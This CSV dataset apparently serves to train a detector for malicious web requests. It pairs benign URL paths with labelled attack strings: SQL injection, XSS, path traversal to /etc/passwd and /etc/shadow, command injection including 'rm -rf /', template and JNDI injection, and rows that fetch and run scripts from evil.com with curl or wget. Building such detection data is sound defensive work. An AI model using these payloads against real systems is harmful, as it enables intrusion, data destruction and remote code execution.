Payload,Label,Type
/search?q=tutorial,0,Benign
GET /item?id=1'; DROP TABLE users-- HTTP/1.1,1,Malicious
<img src=x onerror=alert(1)>,1,Malicious
/api/orders,0,Benign
POST /login HTTP/1.1 username=admin&password=<body onload=alert(1)>,1,Malicious
GET /file?path=/etc/passwd HTTP/1.1,1,Malicious
POST /login HTTP/1.1 username=admin&password=${jndi:ldap://evil.com/a},1,Malicious
POST /login HTTP/1.1 username=admin&password=....//....//etc/passwd,1,Malicious
/static/css/main.css,0,Benign
/about,0,Benign
/api/orders,0,Benign
/search?q=weather,0,Benign
GET /file?path=; cat /etc/passwd HTTP/1.1,1,Malicious
GET /item?id=../../../windows/system32 HTTP/1.1,1,Malicious
/assets/fonts/arial.ttf,0,Benign
/blog,0,Benign
GET /search?q=1' AND '1'='1 HTTP/1.1,1,Malicious
GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1,1,Malicious
POST /login HTTP/1.1 username=admin&password=' UNION SELECT password FROM users--,1,Malicious
POST /login HTTP/1.1 username=admin&password=../../../windows/system32,1,Malicious
/static/js/app.js,0,Benign
GET /file?path=admin'-- HTTP/1.1,1,Malicious
/static/css/main.css,0,Benign
/images/logo.png,0,Benign
POST /login HTTP/1.1 username=admin&password=<input onfocus=alert(1) autofocus>,1,Malicious
/search?q=tech,0,Benign
&& rm -rf /,1,Malicious
/api/users,0,Benign
GET /search?q=; cat /etc/passwd HTTP/1.1,1,Malicious
/static/js/app.js,0,Benign
POST /checkout cart_id=456,0,Benign
POST /login username=john&password=pass123,0,Benign
/search?q=sports,0,Benign
POST /login HTTP/1.1 username=admin&password=../../../windows/system32,1,Malicious
POST /register email=user@example.com,0,Benign
POST /checkout cart_id=456,0,Benign
POST /login username=john&password=pass123,0,Benign
/home,0,Benign
1'; DROP TABLE users--,1,Malicious
GET /file?path=<input onfocus=alert(1) autofocus> HTTP/1.1,1,Malicious
/static/js/app.js,0,Benign
GET /item?id=; cat /etc/passwd HTTP/1.1,1,Malicious
/images/logo.png,0,Benign
GET /file?path=<script>alert(1)</script> HTTP/1.1,1,Malicious
GET /file?path=${jndi:ldap://evil.com/a} HTTP/1.1,1,Malicious
/services,0,Benign
GET /item?id=1' AND '1'='1 HTTP/1.1,1,Malicious
/home,0,Benign
; cat /etc/passwd,1,Malicious
/search?q=news,0,Benign
/api/products,0,Benign
<img src=x onerror=alert(1)>,1,Malicious
GET /file?path=1'; DROP TABLE users-- HTTP/1.1,1,Malicious
GET /file?path=&& rm -rf / HTTP/1.1,1,Malicious
/blog,0,Benign
/index.html,0,Benign
/search?q=tech,0,Benign
<svg onload=alert(1)>,1,Malicious
| ls -la,1,Malicious
/search?q=tech,0,Benign
POST /checkout cart_id=456,0,Benign
/search?q=sports,0,Benign
POST /login username=john&password=pass123,0,Benign
GET /file?path=id=1 OR 1=1 HTTP/1.1,1,Malicious
GET /item?id=admin' OR '1'='1'-- HTTP/1.1,1,Malicious
/api/data,0,Benign
{{7*7}},1,Malicious
GET /search?q=' OR 'a'='a HTTP/1.1,1,Malicious
/assets/fonts/arial.ttf,0,Benign
`cat /etc/shadow`,1,Malicious
POST /login HTTP/1.1 username=admin&password=' UNION SELECT password FROM users--,1,Malicious
POST /login HTTP/1.1 username=admin&password=' OR 'a'='a,1,Malicious
/search?q=news,0,Benign
/etc/passwd,1,Malicious
POST /login HTTP/1.1 username=admin&password=curl http://evil.com/x.sh | sh,1,Malicious
/,0,Benign
GET /item?id=javascript:alert('xss') HTTP/1.1,1,Malicious
/search?q=tech,0,Benign
/assets/fonts/arial.ttf,0,Benign
/,0,Benign
GET /file?path=`cat /etc/shadow` HTTP/1.1,1,Malicious
admin' OR '1'='1'--,1,Malicious
/home,0,Benign
`cat /etc/shadow`,1,Malicious
POST /login HTTP/1.1 username=admin&password=&& rm -rf /,1,Malicious
GET /file?path=%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1,1,Malicious
POST /login HTTP/1.1 username=admin&password=| whoami,1,Malicious
%27%20OR%20%271%27%3D%271,1,Malicious
GET /file?path=1' UNION SELECT NULL-- HTTP/1.1,1,Malicious
POST /login username=john&password=pass123,0,Benign
POST /login HTTP/1.1 username=admin&password=<svg onload=alert(1)>,1,Malicious
/api/products,0,Benign
/about,0,Benign
POST /register email=user@example.com,0,Benign
javascript:alert('xss'),1,Malicious
GET /search?q=..\..\..\windows\system32 HTTP/1.1,1,Malicious
/search?q=sports,0,Benign
' OR '1'='1,1,Malicious
GET /item?id=curl http://evil.com/x.sh | sh HTTP/1.1,1,Malicious
GET /file?path=' UNION SELECT password FROM users-- HTTP/1.1,1,Malicious
GET /item?id=1'; DROP TABLE users-- HTTP/1.1,1,Malicious
GET /item?id=; wget http://evil.com/shell HTTP/1.1,1,Malicious
' OR 'a'='a,1,Malicious
/products,0,Benign
/home,0,Benign
GET /search?q=@{7*7} HTTP/1.1,1,Malicious
/api/orders,0,Benign
GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1,1,Malicious
POST /login HTTP/1.1 username=admin&password=<body onload=alert(1)>,1,Malicious
/contact,0,Benign
/services,0,Benign
POST /login username=john&password=pass123,0,Benign
GET /search?q=${7*7} HTTP/1.1,1,Malicious
GET /item?id=id=1 OR 1=1 HTTP/1.1,1,Malicious
POST /login HTTP/1.1 username=admin&password=<body onload=alert(1)>,1,Malicious
GET /file?path=${jndi:ldap://evil.com/a} HTTP/1.1,1,Malicious
/search?q=sports,0,Benign
/api/products,0,Benign
/api/orders,0,Benign
GET /item?id=' OR 'a'='a HTTP/1.1,1,Malicious
/api/orders,0,Benign
/api/users,0,Benign
POST /checkout cart_id=456,0,Benign
${jndi:ldap://evil.com/a},1,Malicious
GET /search?q=<iframe src=javascript:alert(1)> HTTP/1.1,1,Malicious
GET /search?q=%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1,1,Malicious
/assets/fonts/arial.ttf,0,Benign
/search?q=sports,0,Benign
/api/users,0,Benign
/index.html,0,Benign
/blog,0,Benign
/search?q=news,0,Benign
POST /login HTTP/1.1 username=admin&password=%2e%2e%2f%2e%2e%2fetc%2fpasswd,1,Malicious
/assets/fonts/arial.ttf,0,Benign
/search?q=sports,0,Benign
GET /file?path=' UNION SELECT password FROM users-- HTTP/1.1,1,Malicious
GET /search?q=../../etc/passwd HTTP/1.1,1,Malicious
GET /search?q=<input onfocus=alert(1) autofocus> HTTP/1.1,1,Malicious
GET /search?q=<body onload=alert(1)> HTTP/1.1,1,Malicious
GET /search?q=#{7*7} HTTP/1.1,1,Malicious
/images/logo.png,0,Benign
POST /login username=john&password=pass123,0,Benign
/static/css/main.css,0,Benign
GET /search?q=curl http://evil.com/x.sh | sh HTTP/1.1,1,Malicious
/api/orders,0,Benign
GET /file?path=<body onload=alert(1)> HTTP/1.1,1,Malicious
GET /item?id=<script>alert(1)</script> HTTP/1.1,1,Malicious
/blog,0,Benign
GET /file?path=${jndi:ldap://evil.com/a} HTTP/1.1,1,Malicious
/blog,0,Benign
<body onload=alert(1)>,1,Malicious
GET /search?q=../../etc/passwd HTTP/1.1,1,Malicious
/api/users,0,Benign
/,0,Benign
/about,0,Benign
GET /search?q=1' AND '1'='1 HTTP/1.1,1,Malicious
/api/users,0,Benign
GET /item?id=admin' OR '1'='1'-- HTTP/1.1,1,Malicious
/blog,0,Benign
/home,0,Benign
<script>alert(1)</script>,1,Malicious
GET /file?path=%00%FF%FE%FD HTTP/1.1,1,Malicious
/api/orders,0,Benign
GET /item?id=<input onfocus=alert(1) autofocus> HTTP/1.1,1,Malicious
GET /file?path=; wget http://evil.com/shell HTTP/1.1,1,Malicious
GET /file?path=&& rm -rf / HTTP/1.1,1,Malicious
....//....//etc/passwd,1,Malicious
/etc/passwd,1,Malicious
GET /file?path=`cat /etc/shadow` HTTP/1.1,1,Malicious
POST /login HTTP/1.1 username=admin&password=' OR '1'='1,1,Malicious
/,0,Benign
%2e%2e%2f%2e%2e%2fetc%2fpasswd,1,Malicious
/images/logo.png,0,Benign
GET /item?id=& dir HTTP/1.1,1,Malicious
POST /login username=john&password=pass123,0,Benign
GET /search?q=..\..\..\windows\system32 HTTP/1.1,1,Malicious
POST /login HTTP/1.1 username=admin&password=; cat /etc/passwd,1,Malicious
/search?q=sports,0,Benign
POST /login HTTP/1.1 username=admin&password=<img src=x onerror=alert(1)>,1,Malicious
GET /search?q=<img src=x onerror=alert(1)> HTTP/1.1,1,Malicious
POST /login HTTP/1.1 username=admin&password=%00%FF%FE%FD,1,Malicious
/static/js/app.js,0,Benign
admin'--,1,Malicious
GET /search?q=/etc/passwd HTTP/1.1,1,Malicious
GET /search?q=..\..\..\windows\system32 HTTP/1.1,1,Malicious
GET /item?id=${7*7} HTTP/1.1,1,Malicious
/api/users,0,Benign
POST /register email=user@example.com,0,Benign
/api/users,0,Benign
GET /item?id=' UNION SELECT password FROM users-- HTTP/1.1,1,Malicious
/api/data,0,Benign
GET /file?path=`cat /etc/shadow` HTTP/1.1,1,Malicious
/products,0,Benign
/blog,0,Benign
%2e%2e%2f%2e%2e%2fetc%2fpasswd,1,Malicious
/api/users,0,Benign
POST /login HTTP/1.1 username=admin&password=<iframe src=javascript:alert(1)>,1,Malicious
/api/products,0,Benign
admin'--,1,Malicious
/,0,Benign
/static/js/app.js,0,Benign
GET /file?path=../../../windows/system32 HTTP/1.1,1,Malicious
; wget http://evil.com/shell,1,Malicious
GET /search?q=<body onload=alert(1)> HTTP/1.1,1,Malicious
/blog,0,Benign
POST /login HTTP/1.1 username=admin&password=%3Cscript%3Ealert(1)%3C/script%3E,1,Malicious
GET /search?q=1' UNION SELECT NULL-- HTTP/1.1,1,Malicious
/index.html,0,Benign
POST /register email=user@example.com,0,Benign
/api/products,0,Benign
/search?q=sports,0,Benign
{{7*7}},1,Malicious
POST /login HTTP/1.1 username=admin&password=' OR 'a'='a,1,Malicious
' OR '1'='1,1,Malicious
/assets/fonts/arial.ttf,0,Benign
GET /file?path=curl http://evil.com/x.sh | sh HTTP/1.1,1,Malicious
GET /file?path=javascript:alert('xss') HTTP/1.1,1,Malicious
<body onload=alert(1)>,1,Malicious
GET /search?q={{7*7}} HTTP/1.1,1,Malicious
/api/users,0,Benign
GET /item?id=' OR '1'='1 HTTP/1.1,1,Malicious
/static/js/app.js,0,Benign
/index.html,0,Benign
GET /search?q=| whoami HTTP/1.1,1,Malicious
/about,0,Benign
GET /item?id=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1,1,Malicious
/index.html,0,Benign
1' AND '1'='1,1,Malicious
/services,0,Benign
/static/css/main.css,0,Benign
POST /login username=john&password=pass123,0,Benign
GET /search?q=| ls -la HTTP/1.1,1,Malicious
/about,0,Benign
/home,0,Benign
/search?q=python,0,Benign
POST /checkout cart_id=456,0,Benign
GET /file?path=<svg onload=alert(1)> HTTP/1.1,1,Malicious
GET /file?path=admin' OR '1'='1'-- HTTP/1.1,1,Malicious
GET /file?path=../../etc/passwd HTTP/1.1,1,Malicious
/search?q=tech,0,Benign
/api/data,0,Benign
/search?q=sports,0,Benign
GET /item?id=1' UNION SELECT NULL-- HTTP/1.1,1,Malicious
GET /search?q=1' AND '1'='1 HTTP/1.1,1,Malicious
/index.html,0,Benign
POST /login username=john&password=pass123,0,Benign
<%= 7*7 %>,1,Malicious
GET /item?id=1'; DROP TABLE users-- HTTP/1.1,1,Malicious
/,0,Benign
/images/logo.png,0,Benign
/api/products,0,Benign
GET /item?id=1' AND '1'='1 HTTP/1.1,1,Malicious
POST /login HTTP/1.1 username=admin&password=; wget http://evil.com/shell,1,Malicious
%3Cscript%3Ealert(1)%3C/script%3E,1,Malicious
/contact,0,Benign
/index.html,0,Benign
/home,0,Benign
POST /login HTTP/1.1 username=admin&password=&& rm -rf /,1,Malicious
/static/js/app.js,0,Benign
/,0,Benign
/,0,Benign
GET /item?id=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1,1,Malicious
GET /search?q=' OR 'a'='a HTTP/1.1,1,Malicious
GET /file?path=`cat /etc/shadow` HTTP/1.1,1,Malicious
GET /file?path=| ls -la HTTP/1.1,1,Malicious
/blog,0,Benign
GET /file?path=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1,1,Malicious
/api/products,0,Benign
/products,0,Benign
GET /file?path=<iframe src=javascript:alert(1)> HTTP/1.1,1,Malicious
/,0,Benign
#{7*7},1,Malicious
/api/data,0,Benign
POST /login HTTP/1.1 username=admin&password=| ls -la,1,Malicious
#{7*7},1,Malicious
/search?q=weather,0,Benign
/home,0,Benign
/products,0,Benign
/api/users,0,Benign
POST /login HTTP/1.1 username=admin&password=curl http://evil.com/x.sh | sh,1,Malicious
/api/products,0,Benign
GET /file?path=${jndi:ldap://evil.com/a} HTTP/1.1,1,Malicious
1' AND '1'='1,1,Malicious
/blog,0,Benign
/api/products,0,Benign
GET /search?q=`cat /etc/shadow` HTTP/1.1,1,Malicious
GET /item?id=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1,1,Malicious
/search?q=tech,0,Benign
GET /search?q=../../../var/log/apache/access.log HTTP/1.1,1,Malicious
/assets/fonts/arial.ttf,0,Benign
GET /item?id=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1,1,Malicious
POST /login HTTP/1.1 username=admin&password=| ls -la,1,Malicious
GET /search?q=../../../var/log/apache/access.log HTTP/1.1,1,Malicious
' UNION SELECT password FROM users--,1,Malicious
&& rm -rf /,1,Malicious
/api/orders,0,Benign
/api/orders,0,Benign
<iframe src=javascript:alert(1)>,1,Malicious
GET /file?path=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1,1,Malicious
POST /checkout cart_id=456,0,Benign
GET /search?q=& dir HTTP/1.1,1,Malicious
/search?q=news,0,Benign
GET /file?path=<%= 7*7 %> HTTP/1.1,1,Malicious
/blog,0,Benign
GET /file?path=%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1,1,Malicious
/search?q=news,0,Benign
/,0,Benign
POST /login HTTP/1.1 username=admin&password=#{7*7},1,Malicious
/api/products,0,Benign
GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1,1,Malicious
javascript:alert('xss'),1,Malicious
GET /file?path=%27%20OR%20%271%27%3D%271 HTTP/1.1,1,Malicious
POST /login HTTP/1.1 username=admin&password=${7*7},1,Malicious
GET /search?q=; wget http://evil.com/shell HTTP/1.1,1,Malicious
javascript:alert('xss'),1,Malicious
GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1,1,Malicious
POST /login username=john&password=pass123,0,Benign
/api/orders,0,Benign
/products,0,Benign
GET /item?id=& dir HTTP/1.1,1,Malicious
../../../var/log/apache/access.log,1,Malicious
/contact,0,Benign
GET /item?id=`cat /etc/shadow` HTTP/1.1,1,Malicious
/static/js/app.js,0,Benign
/static/css/main.css,0,Benign
POST /login HTTP/1.1 username=admin&password=' UNION SELECT password FROM users--,1,Malicious
GET /item?id=<iframe src=javascript:alert(1)> HTTP/1.1,1,Malicious
1'; DROP TABLE users--,1,Malicious
/home,0,Benign
/index.html,0,Benign
GET /item?id=' OR '1'='1 HTTP/1.1,1,Malicious
/search?q=news,0,Benign
....//....//etc/passwd,1,Malicious
GET /search?q=javascript:alert('xss') HTTP/1.1,1,Malicious
/,0,Benign
GET /file?path=curl http://evil.com/x.sh | sh HTTP/1.1,1,Malicious
GET /file?path=../../etc/passwd HTTP/1.1,1,Malicious
/search?q=tutorial,0,Benign
POST /login HTTP/1.1 username=admin&password=<script>alert(1)</script>,1,Malicious
/etc/passwd,1,Malicious
GET /search?q=1' AND '1'='1 HTTP/1.1,1,Malicious
POST /register email=user@example.com,0,Benign
POST /login username=john&password=pass123,0,Benign
/static/css/main.css,0,Benign
/search?q=news,0,Benign
/search?q=news,0,Benign
/search?q=tech,0,Benign
/assets/fonts/arial.ttf,0,Benign
/api/products,0,Benign
POST /login HTTP/1.1 username=admin&password=<iframe src=javascript:alert(1)>,1,Malicious
GET /search?q=; wget http://evil.com/shell HTTP/1.1,1,Malicious
/blog,0,Benign
/search?q=tech,0,Benign
POST /login username=john&password=pass123,0,Benign
GET /file?path=<img src=x onerror=alert(1)> HTTP/1.1,1,Malicious
GET /item?id=&& rm -rf / HTTP/1.1,1,Malicious
GET /search?q=1' UNION SELECT NULL-- HTTP/1.1,1,Malicious
admin'--,1,Malicious
GET /file?path=<body onload=alert(1)> HTTP/1.1,1,Malicious
/static/js/app.js,0,Benign
POST /login HTTP/1.1 username=admin&password=`cat /etc/shadow`,1,Malicious
POST /login HTTP/1.1 username=admin&password=1' UNION SELECT NULL--,1,Malicious
POST /login HTTP/1.1 username=admin&password=../../../windows/system32,1,Malicious
GET /file?path=; cat /etc/passwd HTTP/1.1,1,Malicious
GET /item?id=| whoami HTTP/1.1,1,Malicious
/search?q=sports,0,Benign
GET /file?path=id=1 OR 1=1 HTTP/1.1,1,Malicious
/search?q=tutorial,0,Benign
GET /search?q=`cat /etc/shadow` HTTP/1.1,1,Malicious
POST /login HTTP/1.1 username=admin&password=<body onload=alert(1)>,1,Malicious
GET /item?id=../../etc/passwd HTTP/1.1,1,Malicious
/api/orders,0,Benign
POST /checkout cart_id=456,0,Benign
POST /login HTTP/1.1 username=admin&password=' OR 'a'='a,1,Malicious
GET /item?id=<svg onload=alert(1)> HTTP/1.1,1,Malicious
/products,0,Benign
POST /login HTTP/1.1 username=admin&password=<img src=x onerror=alert(1)>,1,Malicious
GET /item?id=; wget http://evil.com/shell HTTP/1.1,1,Malicious
GET /search?q=admin' OR '1'='1'-- HTTP/1.1,1,Malicious
1' AND '1'='1,1,Malicious
/about,0,Benign
/search?q=python,0,Benign
/api/users,0,Benign
/assets/fonts/arial.ttf,0,Benign
/search?q=tech,0,Benign
/static/css/main.css,0,Benign
../../etc/passwd,1,Malicious
/api/products,0,Benign
GET /search?q=admin'-- HTTP/1.1,1,Malicious
GET /file?path=<input onfocus=alert(1) autofocus> HTTP/1.1,1,Malicious
/search?q=news,0,Benign
